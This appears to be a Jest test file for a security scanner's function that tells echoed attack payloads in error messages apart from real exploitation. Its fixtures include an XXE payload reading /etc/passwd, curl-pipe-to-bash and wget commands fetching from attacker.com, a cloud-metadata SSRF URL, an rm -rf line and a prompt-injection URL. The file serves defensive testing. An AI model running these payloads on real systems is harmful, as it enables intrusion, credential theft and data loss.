/**
 * Issue #201: Payload Echo Detection Tests
 *
 * Tests for false positive prevention when servers echo attack payloads
 * in error messages. The security module was flagging false positives because
 * regex patterns matched payload text echoed in errors, not actual exploitation.
 *
 * Example false positive:
 *   Payload: <?xml...><soap:Envelope...xxe SYSTEM...>
 *   Response: File not found: /path/to/<?xml...><soap:Envelope...xxe SYSTEM...>
 *   Regex: /(soap.*xxe)/i matches echoed payload, not XXE exploitation
 */

import {
  isPayloadPartiallyEchoed,
  isPayloadInErrorContext,
  hasErrorContext,
} from "../modules/securityTests/SecurityPatternLibrary";

describe("Issue #201: Payload Echo Detection", () => {
  describe("isPayloadPartiallyEchoed", () => {
    describe("XXE payloads echoed in file errors", () => {
      it("detects XXE SOAP payload echoed in file-not-found error", () => {
        const payload =
          '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>';
        const response =
          'File not found: /Users/test/audio/<?xml version="1.0"?><soap:Envelope...xxe SYSTEM...>';

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects XXE payload with truncated error message", () => {
        const payload =
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
        const response =
          'Error: Invalid file path: <?xml version="1.0"?><!DOCTYPE foo...';

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("SSRF/URL payloads echoed in errors", () => {
      it("detects URL payload echoed in file-not-found error", () => {
        const payload = "http://evil.com/inject.txt";
        const response =
          "File not found: /Users/test/http:/evil.com/inject.txt";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects internal URL payload echoed in error", () => {
        const payload = "http://169.254.169.254/latest/meta-data/";
        const response =
          "Error: Cannot access file http://169.254.169.254/latest/meta-data/";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("RCE/command payloads echoed in errors", () => {
      it("detects wget command echoed in file-not-found error", () => {
        const payload = "wget http://attacker.com/malware -O /tmp/x";
        const response =
          "File not found: /Users/test/wget http:/attacker.com/malware -O /tmp/x";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects curl command echoed in error", () => {
        const payload = "curl http://attacker.com/shell.sh | bash";
        const response =
          "Invalid path: curl http://attacker.com/shell.sh | bash";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects system command echoed in error", () => {
        const payload = "ls -la /etc/passwd";
        const response = "Error: file 'ls -la /etc/passwd' not found";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("exact match behavior (backward compatibility)", () => {
      it("detects exact payload match", () => {
        const payload = "test payload";
        const response = "Response contains test payload here";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("handles case insensitivity", () => {
        const payload = "SELECT * FROM users";
        const response = "Error: select * from users is not allowed";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("segment-based detection", () => {
      it("detects multiple segments of modified payload", () => {
        // When payload is split/escaped but segments are present
        const payload = "wget http://attacker.com/malware -O /tmp/malicious";
        const response =
          "Error: Could not process - invalid segments: wget, attacker, malware, malicious";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("negative cases - should NOT detect echo", () => {
      it("returns false for completely different response", () => {
        const payload =
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
        const response = "Success: File loaded successfully";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });

      it("returns false for generic error without payload content", () => {
        const payload = "wget http://attacker.com/malware";
        const response = "Error: Operation not permitted";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });

      it("returns false when only coincidental short matches", () => {
        const payload = "rm -rf /important/data";
        const response = "The data was not found in the database";

        // "data" appears in both but that's coincidental, not echo
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });
    });

    describe("edge cases - very short payloads (TEST-REQ-001)", () => {
      it("handles payload shorter than minPrefixLength default (30 chars)", () => {
        // Payload is 20 chars, shorter than default minPrefixLength of 30
        const payload = "test_payload_20chars";
        const response = "Error: file 'test_payload_20chars' not found";

        // Should still detect via exact match
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("handles very short payload (< 10 chars) not echoed", () => {
        // Payload is 8 chars, below the prefix.length >= 10 safety check
        const payload = "shortval";
        const response = "Error: Invalid input provided";

        // Should return false (no exact match, prefix too short)
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });

      it("handles very short payload (< 10 chars) when echoed", () => {
        // Payload is 8 chars, should still work via exact match
        const payload = "shortval";
        const response = "Error: 'shortval' is invalid";

        // Should return true via exact match despite being < 10 chars
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("handles payload with all segments ≤5 chars", () => {
        // All segments after splitting are ≤5 chars: "a", "1", "b", "2", "c", "3"
        const payload = "a=1&b=2&c=3";
        const response = "Error: parameters a=1&b=2&c=3 are invalid";

        // Should detect via exact match, not segment match (all segments filtered out)
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("handles payload with single long segment", () => {
        // Single segment after splitting (no delimiters)
        const payload = "verylongsinglesegmentwithnospaces";
        const response =
          "Error: 'verylongsinglesegmentwithnospaces' is not valid";

        // Should detect via exact match or prefix match
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("returns false when single long segment not present", () => {
        // Single segment that's not in response
        const payload = "verylongsinglesegmentwithnospaces";
        const response = "Error: Invalid request format";

        // Should return false (no match)
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });
    });

    describe("custom minPrefixLength parameter (TEST-REQ-003)", () => {
      it("detects echo with custom minPrefixLength of 20", () => {
        // Payload is 40 chars, prefix length set to 20
        const payload = "attack_payload_exactly_40_characters";
        const response =
          "Error: file 'attack_payload_exactly_40_characters' not found";

        // Should detect with custom prefix length
        expect(isPayloadPartiallyEchoed(response, payload, 20)).toBe(true);
      });

      it("detects echo with custom minPrefixLength of 50", () => {
        // Payload is 40 chars, prefix length requested is 50 (longer than payload)
        const payload = "attack_payload_exactly_40_characters";
        const response =
          "Error: file 'attack_payload_exactly_40_characters' not found";

        // Should still detect (minPrefixLength clamped to payload length)
        expect(isPayloadPartiallyEchoed(response, payload, 50)).toBe(true);
      });

      it("tests boundary condition: payload exactly 30 chars with 30-char prefix match", () => {
        // Payload is exactly 30 chars
        const payload = "attack_payload_thirty_characts";
        const response =
          "Error: file 'attack_payload_thirty_characts' not found";

        // Should detect with default minPrefixLength of 30
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
        // And with explicit 30
        expect(isPayloadPartiallyEchoed(response, payload, 30)).toBe(true);
      });

      it("tests custom minPrefixLength does not match when prefix absent", () => {
        // Payload is 40 chars, only last 15 chars present in response
        const payload = "very_long_attack_payload_with_unique_suffix";
        const response = "Error: suffix was invalid";

        // Should return false with default minPrefixLength of 30 (no 30-char prefix match)
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
        // Should return false with custom minPrefixLength of 20 (no 20-char prefix match)
        expect(isPayloadPartiallyEchoed(response, payload, 20)).toBe(false);
      });

      it("tests minPrefixLength=10 detects shorter prefix", () => {
        // Payload is 25 chars, first 10 chars present in response
        const payload = "testprefix_and_more_stuff";
        const response = "Error: testprefix was found but invalid";

        // Should detect with minPrefixLength of 10
        expect(isPayloadPartiallyEchoed(response, payload, 10)).toBe(true);
        // Should NOT detect with default minPrefixLength of 30 (prefix too short)
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });
    });
  });

  describe("isPayloadInErrorContext", () => {
    it("returns true for partial payload in error context", () => {
      const payload =
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
      const response =
        'Error: File not found: <?xml version="1.0"?><!DOCTYPE foo...truncated';

      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("returns true for URL payload in file-not-found error", () => {
      const payload = "http://evil.com/inject.txt";
      const response = "File not found: /path/http:/evil.com/inject.txt";

      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("returns false when no error context", () => {
      const payload = "test payload";
      const response = "Success: test payload was processed";

      // Has payload but no error context
      expect(isPayloadInErrorContext(response, payload)).toBe(false);
    });

    it("returns false when error context but no payload echo", () => {
      const payload = '<?xml version="1.0"?><!DOCTYPE foo>';
      const response = "Error: Invalid operation";

      // Has error context but payload not echoed
      expect(isPayloadInErrorContext(response, payload)).toBe(false);
    });
  });

  describe("hasErrorContext pattern coverage", () => {
    const errorPatterns = [
      "File not found: /path/to/file",
      "Error loading resource",
      "Could not find the specified file",
      "Permission denied",
      "Access denied",
      "404 not found",
      "Invalid path specified",
      "Operation failed",
      "Request rejected",
    ];

    errorPatterns.forEach((errorMessage) => {
      it(`detects error context: "${errorMessage.substring(0, 30)}..."`, () => {
        expect(hasErrorContext(errorMessage)).toBe(true);
      });
    });
  });

  describe("ElevenLabs Player audit false positive scenarios", () => {
    // These are the exact scenarios from Issue #201

    it("XXE in SOAP: File not found error should be detected as echo", () => {
      const payload =
        '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>';
      const response =
        'File not found: /Users/testuser/audio/<?xml version="1.0"?><soap:Envelope xmlns:soap="..."><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...';

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("Indirect Prompt Injection URL: File not found should be detected as echo", () => {
      const payload = "http://evil.com/inject.txt";
      const response =
        "File not found: /Users/testuser/audio/http:/evil.com/inject.txt";

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("Blacklist Bypass wget: File not found should be detected as echo", () => {
      const payload = "wget http://attacker.com/malware -O /tmp/x";
      const response =
        "File not found: /Users/testuser/audio/wget http:/attacker.com/malware -O /tmp/x";

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });
  });
});
